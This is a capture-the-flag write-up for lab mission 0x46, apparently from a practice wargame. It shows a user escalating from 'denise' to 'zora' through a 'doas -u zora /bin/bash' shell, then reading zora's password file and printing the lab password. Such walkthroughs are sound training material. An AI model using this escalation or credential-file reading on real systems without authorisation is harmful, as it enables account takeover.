# 0x46
This write-up explains the steps taken to complete mission 0x46, starting from user `denise` and escalating to `zora`.

## Mission 
As usual, we read the mission:
```bash
denise@venus:~$ cat mission.txt 
################
# MISSION 0x46 #
################

## EN ##
The user zora is screaming doas!
```

## Method of solving
We checked the home directory and confirmed there were no obvious password files or images, suggeting the solution involved the system configuration mentioned in the hint.
```bash
denise@venus:~$ ls -la
total 32
drwxr-x--- 2 root   denise 4096 Apr  5  2024 .
drwxr-xr-x 1 root   root   4096 Apr  5  2024 ..
-rw-r--r-- 1 denise denise  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 denise denise 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 denise denise  807 Apr 23  2023 .profile
-rw-r----- 1 root   denise   31 Apr  5  2024 flagz.txt
-rw-r----- 1 root   denise  144 Apr  5  2024 mission.txt
```

The clue "doas" refers to a utility that allows a user to execute commands as another user, similar to `sudo`. Since `denise` was not allowed to use `sudo`, we tested the permission for `doas`.
By executing `/bin/bash` through `doas` while specifying `zora` as the target user, we were able to spawn a shell with Zora's privileges using Denise's own password.
```bash
denise@venus:~$ doas -u zora /bin/bash
doas (denise@venus) password: 
zora@venus:/pwned/denise$ id
uid=1047(zora) gid=1047(zora) groups=1047(zora)
```
We can find `zora`'s pasword.
```bash
zora@venus:/pwned/denise$ cd 
zora@venus:~$ ls            
flagz.txt  mission.txt  zora_pass.txt
zora@venus:~$ cat zora_pass.txt 
BWm1R3jCcb53riO
```

## Key command
`doas -su zora`
or `doas -u zora /bin/bash`


***You are welcome!***
